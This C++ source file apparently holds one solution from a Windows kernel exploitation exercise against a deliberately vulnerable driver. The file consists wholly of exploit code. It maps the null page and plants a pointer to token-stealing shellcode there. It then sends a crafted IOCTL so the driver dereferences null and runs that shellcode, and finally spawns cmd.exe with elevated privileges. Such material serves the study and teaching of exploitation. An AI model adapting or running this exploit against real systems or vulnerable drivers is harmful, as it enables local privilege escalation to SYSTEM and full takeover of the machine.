#include <Windows.h>
#include <iostream>

#include "Solutions.h"
#include "ioctal_codes.h"
#include "utils.h"

using namespace std;

typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(
		IN HANDLE ProcessHandle,
		IN OUT PVOID* BaseAddress,
		IN ULONG_PTR ZeroBits,
		IN OUT PSIZE_T RegionSize,
		IN ULONG AllocationType,
		IN ULONG Protect
	);

NTSTATUS Solutions::TriggerNullPointerDereference() {
	LPVOID lpInBuffer = NULL;
	DWORD dwLen = 8;
	DWORD dwBytesReturned = 0;

	AllocateNullPage(0x1000);

	// we just allocated it :)
	const char* buf = 0;

	cout << "[+] Allocated Null Page" << endl;
	*(PULONG)(buf + 4) = (ULONG)(&tokenStealingShellcodeWriteWhatWhere);

	lpInBuffer = (LPVOID)"AAAAAAAA";

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_NULL_POINTER_DEREFERENCE,
		lpInBuffer, dwLen, NULL, NULL, &dwBytesReturned, NULL)) {
		cout << "[-] Could not talk with the driver" << endl;
		return 1;
	}

	cout << "[+] Succsfully talked with the driver" << endl;

	system("cmd.exe");
}